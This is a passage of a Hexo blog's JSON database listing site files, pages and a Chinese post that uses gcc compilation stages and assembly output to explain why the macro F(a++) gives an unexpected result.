"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1471334672509},{"_id":"themes/next/source/images/arm-none-eabi-gcc.png","hash":"068ccd4b208f28bbbc72fc6b8e2bfc570c7e55d9","modified":1472110984250},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.svg","hash":"2b3c8ba7008cc014d8fb37abc6f9f49aeda83824","modified":1471334672517},{"_id":"source/images/pixhawk.jpg","hash":"1c6af7e798710cde3975014757ecf220215e127a","modified":1472107517410},{"_id":"themes/next/.git/objects/pack/pack-5182bfdb5614ae5dfee668f8addf954c0ab190af.pack","hash":"5d566632504b87ecfaa3d9bd0ff5401a974682d9","modified":1471334672261},{"_id":"source/images/OpenWrt_ssh.png","hash":"57c374da62e0a03d2ae84a932e71018fcf8c25ef","modified":1477638029062},{"_id":"source/images/OpenWrt.png","hash":"56347e81efb20b419a448af931615c9098cb1a06","modified":1477637717821},{"_id":"public/atom.xml","hash":"8cd8c0c1b58fa0ac969c4c9b9031de01b008e540","modified":1478162390159},{"_id":"public/sitemap.xml","hash":"ed76f3da213dc2516be509df9de38166994b6242","modified":1478162390194},{"_id":"public/search.xml","hash":"fce8f485634501d5a1ed36cbfb76db397af5850a","modified":1478162390194},{"_id":"public/404.html","hash":"d7acd1349c6560e7f1a300f8865f80b3b0547d3f","modified":1477654101874},{"_id":"public/about/index.html","hash":"d5b2b14605ac21e2b4bc2148fb9bd064df7c7d9c","modified":1477654101904},{"_id":"public/categories/index.html","hash":"e8ed0d9add854b9f257615cc9a993ae3994cd3a6","modified":1477654101905},{"_id":"public/tags/index.html","hash":"7d2f085f01a0b88f44a7a5e474b58991923d8d25","modified":1477654101905},{"_id":"public/2016/10/28/没这么好的馅饼/index.html","hash":"a1a6ef548978ce19af70ffda78930c11ea775efe","modified":1477702283022},{"_id":"public/2016/10/17/job-summary/index.html","hash":"5283b2a8a2d8567d999b3520945605db41930bcf","modified":1477654101921},{"_id":"public/2016/10/27/常用VPN服务器配置/index.html","hash":"508e59304ff530236bc970ff22bab27430d73cdb","modified":1477654101921},{"_id":"public/2016/08/26/netcat简述/index.html","hash":"7e7a2782cc96ae238e59a0a7f5923ad1fb68ce77","modified":1477654101921},{"_id":"public/2016/09/25/一起来撸printf吧/index.html","hash":"d13d35d7205b98795c08b739c3066b522c15130e","modified":1477654101922},{"_id":"public/2016/09/06/C语言宏定义小试/index.html","hash":"d5733e756f18ae2ccd91334da3e07b3db1398118","modified":1477654101922},{"_id":"public/2016/08/25/无人机学习概况/index.html","hash":"ca43d4a97e4ef8debee95df00a8db5d1cb4211cf","modified":1477654101922},{"_id":"public/2016/08/16/Hello-world/index.html","hash":"a8c4c9a91ea50d74579fb258e842449a6af9563c","modified":1478162390267},{"_id":"public/archives/index.html","hash":"3cb546a71ee72c7a235048b85728fe48882b87f1","modified":1477654101923},{"_id":"public/archives/2016/index.html","hash":"6b72658ec0b3c23fc4fc9f3749db052504faf982","modified":1477654101923},{"_id":"public/archives/2016/08/index.html","hash":"3a5be4d561a003a254c3dba73d7f04ab9f9d1c21","modified":1477654101923},{"_id":"public/archives/2016/09/index.html","hash":"9d67cfbf8de3010922f96aee8655f80bd2ae6672","modified":1477654101925},{"_id":"public/archives/2016/10/index.html","hash":"626ac90343902864c751aa939a4113a6df4e676b","modified":1477654101929},{"_id":"public/categories/study/index.html","hash":"54c875198ac04bd9dedfde5e4932b764af5c40e7","modified":1477654101929},{"_id":"public/categories/misc/index.html","hash":"aecabfd14459ca3b44249d2cb9cdfefd93aabe6e","modified":1477654101929},{"_id":"public/categories/study/misc/index.html","hash":"222f3f246d18da2ca1c66b6e8773b7761812b7be","modified":1477654101929},{"_id":"public/categories/study/work/index.html","hash":"b14d1b7254108d022642c336dd9a2b910e59d579","modified":1477654101930},{"_id":"public/index.html","hash":"de30b2ba4daaa969d9caed91bc71232e12b4ea93","modified":1477654101930},{"_id":"public/page/2/index.html","hash":"d38884e37d31f96bcd8d890f1b52bcce2a185be6","modified":1477654101930},{"_id":"public/page/3/index.html","hash":"2d012878de72fa6fd200a0ba63a8e15534aaac84","modified":1477654101930},{"_id":"public/tags/C-C/index.html","hash":"327f4cf6c6435f88a2bd3ac03c4eb540e2e2a0f4","modified":1477654101931},{"_id":"public/tags/Linux/index.html","hash":"49a411609df50c035f7f4c28cfb2f3e2674ea12c","modified":1477654101931},{"_id":"public/tags/misc/index.html","hash":"fd148114de97fb2c10ec7670f28cc321de799625","modified":1477654101931},{"_id":"public/tags/Configure/index.html","hash":"d252ea61a2d68312f620da68d91841617cc7b917","modified":1477654101931},{"_id":"public/tags/network-security/index.html","hash":"b046550ce946776ec4412753c6f16d8aa207c5a5","modified":1477654101931},{"_id":"public/tags/Linux-kernel/index.html","hash":"ab1722b6092451074f3e0058bc469a109314f24f","modified":1477654101932},{"_id":"public/tags/information-security/index.html","hash":"b313d674631e598459086d89132df8b7910516b8","modified":1477654101932},{"_id":"public/tags/shell/index.html","hash":"49d050197f16ff54f82b3e1aac65ed5c2b1f0b5c","modified":1477654101932},{"_id":"public/tags/pipe/index.html","hash":"1832b1a04d44e01e606adce38d49a6b295becb62","modified":1477654101932},{"_id":"public/tags/emb/index.html","hash":"ccf74c116f5592e41f03ec27d62ec63280dcc482","modified":1477654101932},{"_id":"public/tags/uav/index.html","hash":"eb8809d027d27670626f1f275ce807ededd6e07a","modified":1477654101932},{"_id":"public/tags/pixhawk/index.html","hash":"3328c3204d0fbcbee5eb448c06a9fe948d459884","modified":1477654101933},{"_id":"public/2016/09/18/网络安全基本要素及对策/index.html","hash":"33c5856e8bc9264938993329363e008ef8a66214","modified":1477654101933},{"_id":"public/2016/08/23/vim-and-emacs/index.html","hash":"682120b84333150ab1acfe9f74cc525ca2100a8e","modified":1477654101933},{"_id":"public/2016/08/21/memory-align/index.html","hash":"7251b7a439b30971f60cbc9adefc745e7670afd2","modified":1477654101933},{"_id":"public/images/OpenWrt.png","hash":"56347e81efb20b419a448af931615c9098cb1a06","modified":1477654101936},{"_id":"public/images/OpenWrt_ssh.png","hash":"57c374da62e0a03d2ae84a932e71018fcf8c25ef","modified":1477654101936}],"Category":[{"name":"study","_id":"ciuteb7or0004r1m1nmzmu5f7"},{"name":"misc","_id":"ciuteb7pb0009r1m1s1wvjbic"},{"name":"misc","parent":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7r1000pr1m1n19eobbk"},{"name":"work","parent":"ciuteb7or0004r1m1nmzmu5f7","_id":"ciuteb7s3000wr1m17wojs1p8"}],"Data":[],"Page":[{"_content":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n    <meta name=\"robots\" content=\"all\" />\n    <meta name=\"robots\" content=\"index,follow\"/>\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","source":"404.html","raw":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n    <meta name=\"robots\" content=\"all\" />\n    <meta name=\"robots\" content=\"index,follow\"/>\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","date":"2016-09-02T12:52:21.446Z","updated":"2016-09-02T12:52:21.446Z","path":"404.html","title":"","comments":1,"layout":"page","_id":"ciuteb74w0000r1m1qlqpg47i","content":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n    <meta name=\"robots\" content=\"all\">\n    <meta name=\"robots\" content=\"index,follow\">\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","excerpt":"","more":"<!DOCTYPE HTML>\n<html>\n<head>\n    <title>404 - rutk1t0r's blog</title>\n    <meta name=\"description\" content=\"404 Not Found！\">\n    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n    <meta name=\"robots\" content=\"all\" />\n    <meta name=\"robots\" content=\"index,follow\"/>\n</head>\n<body>\n    <script type=\"text/javascript\" src=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/search_children.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n"},{"title":"about","date":"2016-08-16T11:30:46.000Z","type":"about","comments":0,"_content":"\n\n底层技术爱好者，崇尚汇编，热爱C，喜欢Linux，一直想进行底层安全研究．\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2016-08-16 19:30:46\ntype: \"about\"\ncomments: false\n---\n\n\n底层技术爱好者，崇尚汇编，热爱C，喜欢Linux，一直想进行底层安全研究．\n","updated":"2016-09-01T05:26:00.757Z","path":"about/index.html","layout":"page","_id":"ciuteb7u2001yr1m1zvqdjdqu","content":"<p>底层技术爱好者，崇尚汇编，热爱C，喜欢Linux，一直想进行底层安全研究．</p>\n","excerpt":"","more":"<p>底层技术爱好者，崇尚汇编，热爱C，喜欢Linux，一直想进行底层安全研究．</p>\n"},{"title":"categories","date":"2016-08-16T11:28:19.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2016-08-16 19:28:19\ntype: \"categories\"\ncomments: false\n---\n","updated":"2016-08-16T11:29:09.850Z","path":"categories/index.html","layout":"page","_id":"ciuteb7u3001zr1m176ok39bm","content":"","excerpt":"","more":""},{"title":"tags","date":"2016-08-16T11:29:45.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2016-08-16 19:29:45\ntype: \"tags\"\ncomments: false\n---\n","updated":"2016-08-16T11:30:22.462Z","path":"tags/index.html","layout":"page","_id":"ciuteb7u50020r1m1f4xxfn4p","content":"","excerpt":"","more":""}],"Post":[{"title":"C语言宏定义小试","date":"2016-09-06T12:51:30.000Z","_content":"\n> 今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。\n\n---\n\n# gcc编译过程分析\n![gcc_program](/images/gcc_program.png)\n\n如上图所示，上图是在**《程序员自我修养》**这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步`gcc sources -o target`是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用`++a`看看结果。\n```C\n#include <stdio.h>\n\n#define F(x) ((x)*(x))\nvoid main(void)\n{\n\tint a = 4;\n\t//printf(\"%d\\n\", F(++a));\n\tprintf(\"%d\\n\", F(a++));\n}\n```\n\n# 预处理\n首先我们看下图的源文件，其中就是涉及到了主要矛盾，**宏定义**。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用**const**。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。\n![compile](/images/compile.png)\n接下来我们键入\n```C\ngcc -E mocro_define.c -o mocro_define.i\n```\n![define_E](/images/define_E.png)\n我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。\n\n# 编译\n我们键入以下命令，其中的`-masm=intel`选项是让生成的汇编代码为intel格式的而非AT&T格式的，个人还是习惯看intel格式的。\n```C\ngcc -S mocro_define.i -o mocro_define.s -masm=intel\n```\n![define_S](/images/define_S.png)\n主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了`[ebp-12]`,即a。然后再将它的值送到`edx`寄存器，之后编译器利用`lea`指令优化使得`a++`执行，而后立即回送至内存中的a。之后又使得`a++`执行并回送至内存中。但是注意到，`imul`指令执行的时候仍然用的是`edx`和`eax`的值，即4\\*5,而`ecx`值虽然为6(最后的a)但是并不参与运算。最后直接将`eax`压栈`call printf`即可打印出来结果。在这里可以看出两个`a++`仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似`a++`运算符的。\n![define_S_main](/images/define_S_main.png)\n\n# 汇编\n之后我们键入以下命令继续这个过程：\n```C\ngcc -c mocro_define.s -o mocro_define.o\n```\n![define_c](/images/define_c.png)\n我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。\n# 链接\n键入以下命令并执行可执行程序：\n```C\ngcc mocro_define.o -o mocro_define\n./mocro_define\n```\n![define_o](/images/define_o.png)\n最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。\n\n# 总结\n这篇文章主要还是从C程序的编译过程来逐步拆解分析。**宏定义**本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。\n","source":"_posts/C语言宏定义小试.md","raw":"---\ntitle: C语言宏定义小试\ndate: 2016-09-06 20:51:30\ntags:\n- C/C++\n- Linux\ncategories:\n- study\n---\n\n> 今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。\n\n---\n\n# gcc编译过程分析\n![gcc_program](/images/gcc_program.png)\n\n如上图所示，上图是在**《程序员自我修养》**这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步`gcc sources -o target`是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用`++a`看看结果。\n```C\n#include <stdio.h>\n\n#define F(x) ((x)*(x))\nvoid main(void)\n{\n\tint a = 4;\n\t//printf(\"%d\\n\", F(++a));\n\tprintf(\"%d\\n\", F(a++));\n}\n```\n\n# 预处理\n首先我们看下图的源文件，其中就是涉及到了主要矛盾，**宏定义**。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用**const**。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。\n![compile](/images/compile.png)\n接下来我们键入\n```C\ngcc -E mocro_define.c -o mocro_define.i\n```\n![define_E](/images/define_E.png)\n我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。\n\n# 编译\n我们键入以下命令，其中的`-masm=intel`选项是让生成的汇编代码为intel格式的而非AT&T格式的，个人还是习惯看intel格式的。\n```C\ngcc -S mocro_define.i -o mocro_define.s -masm=intel\n```\n![define_S](/images/define_S.png)\n主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了`[ebp-12]`,即a。然后再将它的值送到`edx`寄存器，之后编译器利用`lea`指令优化使得`a++`执行，而后立即回送至内存中的a。之后又使得`a++`执行并回送至内存中。但是注意到，`imul`指令执行的时候仍然用的是`edx`和`eax`的值，即4\\*5,而`ecx`值虽然为6(最后的a)但是并不参与运算。最后直接将`eax`压栈`call printf`即可打印出来结果。在这里可以看出两个`a++`仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似`a++`运算符的。\n![define_S_main](/images/define_S_main.png)\n\n# 汇编\n之后我们键入以下命令继续这个过程：\n```C\ngcc -c mocro_define.s -o mocro_define.o\n```\n![define_c](/images/define_c.png)\n我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。\n# 链接\n键入以下命令并执行可执行程序：\n```C\ngcc mocro_define.o -o mocro_define\n./mocro_define\n```\n![define_o](/images/define_o.png)\n最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。\n\n# 总结\n这篇文章主要还是从C程序的编译过程来逐步拆解分析。**宏定义**本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。\n","slug":"C语言宏定义小试","published":1,"updated":"2016-09-07T09:39:05.549Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7nw0001r1m10to9vaou","content":"<blockquote>\n<p>今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。</p>\n</blockquote>\n<hr>\n<h1 id=\"gcc编译过程分析\"><a href=\"#gcc编译过程分析\" class=\"headerlink\" title=\"gcc编译过程分析\"></a>gcc编译过程分析</h1><p><img src=\"/images/gcc_program.png\" alt=\"gcc_program\"></p>\n<p>如上图所示，上图是在<strong>《程序员自我修养》</strong>这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步<code>gcc sources -o target</code>是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用<code>++a</code>看看结果。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> F(x) ((x)*(x))</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">4</span>;</div><div class=\"line\">\t<span class=\"comment\">//printf(\"%d\\n\", F(++a));</span></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, F(a++));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"预处理\"><a href=\"#预处理\" class=\"headerlink\" title=\"预处理\"></a>预处理</h1><p>首先我们看下图的源文件，其中就是涉及到了主要矛盾，<strong>宏定义</strong>。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用<strong>const</strong>。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。<br><img src=\"/images/compile.png\" alt=\"compile\"><br>接下来我们键入<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -E mocro_define.c -o mocro_define.i</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_E.png\" alt=\"define_E\"><br>我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。</p>\n<h1 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h1><p>我们键入以下命令，其中的<code>-masm=intel</code>选项是让生成的汇编代码为intel格式的而非AT&amp;T格式的，个人还是习惯看intel格式的。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -S mocro_define.i -o mocro_define.s -masm=intel</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_S.png\" alt=\"define_S\"><br>主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了<code>[ebp-12]</code>,即a。然后再将它的值送到<code>edx</code>寄存器，之后编译器利用<code>lea</code>指令优化使得<code>a++</code>执行，而后立即回送至内存中的a。之后又使得<code>a++</code>执行并回送至内存中。但是注意到，<code>imul</code>指令执行的时候仍然用的是<code>edx</code>和<code>eax</code>的值，即4*5,而<code>ecx</code>值虽然为6(最后的a)但是并不参与运算。最后直接将<code>eax</code>压栈<code>call printf</code>即可打印出来结果。在这里可以看出两个<code>a++</code>仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似<code>a++</code>运算符的。<br><img src=\"/images/define_S_main.png\" alt=\"define_S_main\"></p>\n<h1 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h1><p>之后我们键入以下命令继续这个过程：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -c mocro_define.s -o mocro_define.o</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_c.png\" alt=\"define_c\"><br>我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。</p>\n<h1 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h1><p>键入以下命令并执行可执行程序：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc mocro_define.o -o mocro_define</div><div class=\"line\">./mocro_define</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_o.png\" alt=\"define_o\"><br>最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>这篇文章主要还是从C程序的编译过程来逐步拆解分析。<strong>宏定义</strong>本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。</p>\n","excerpt":"","more":"<blockquote>\n<p>今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。</p>\n</blockquote>\n<hr>\n<h1 id=\"gcc编译过程分析\"><a href=\"#gcc编译过程分析\" class=\"headerlink\" title=\"gcc编译过程分析\"></a>gcc编译过程分析</h1><p><img src=\"/images/gcc_program.png\" alt=\"gcc_program\"></p>\n<p>如上图所示，上图是在<strong>《程序员自我修养》</strong>这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步<code>gcc sources -o target</code>是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用<code>++a</code>看看结果。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> F(x) ((x)*(x))</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">4</span>;</div><div class=\"line\">\t<span class=\"comment\">//printf(\"%d\\n\", F(++a));</span></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, F(a++));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"预处理\"><a href=\"#预处理\" class=\"headerlink\" title=\"预处理\"></a>预处理</h1><p>首先我们看下图的源文件，其中就是涉及到了主要矛盾，<strong>宏定义</strong>。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用<strong>const</strong>。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。<br><img src=\"/images/compile.png\" alt=\"compile\"><br>接下来我们键入<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -E mocro_define.c -o mocro_define.i</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_E.png\" alt=\"define_E\"><br>我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。</p>\n<h1 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h1><p>我们键入以下命令，其中的<code>-masm=intel</code>选项是让生成的汇编代码为intel格式的而非AT&amp;T格式的，个人还是习惯看intel格式的。<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -S mocro_define.i -o mocro_define.s -masm=intel</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_S.png\" alt=\"define_S\"><br>主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了<code>[ebp-12]</code>,即a。然后再将它的值送到<code>edx</code>寄存器，之后编译器利用<code>lea</code>指令优化使得<code>a++</code>执行，而后立即回送至内存中的a。之后又使得<code>a++</code>执行并回送至内存中。但是注意到，<code>imul</code>指令执行的时候仍然用的是<code>edx</code>和<code>eax</code>的值，即4*5,而<code>ecx</code>值虽然为6(最后的a)但是并不参与运算。最后直接将<code>eax</code>压栈<code>call printf</code>即可打印出来结果。在这里可以看出两个<code>a++</code>仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似<code>a++</code>运算符的。<br><img src=\"/images/define_S_main.png\" alt=\"define_S_main\"></p>\n<h1 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h1><p>之后我们键入以下命令继续这个过程：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc -c mocro_define.s -o mocro_define.o</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_c.png\" alt=\"define_c\"><br>我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。</p>\n<h1 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" 